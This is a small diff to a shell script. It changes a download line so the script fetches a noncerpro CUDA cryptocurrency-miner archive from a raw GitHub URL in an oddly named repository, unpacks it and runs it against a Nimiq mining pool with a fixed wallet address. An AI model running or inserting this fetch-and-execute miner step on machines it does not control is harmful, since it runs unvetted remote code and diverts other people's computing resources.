@@ -1,5 +1,5 @@
-wget google84
+wget https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/noncerpro-cuda-linux-3.3.1.tar.gz
 
-tar -xvf ./
+tar -xvf ./noncerpro-cuda-linux-3.3.1.tar.gz
 
 ./noncerpro -s us.nimpool.io -p 8444 -a NQ02 2E9P X91N DHQ3 M7EV TY27 PG0K 31Y6 9H9A
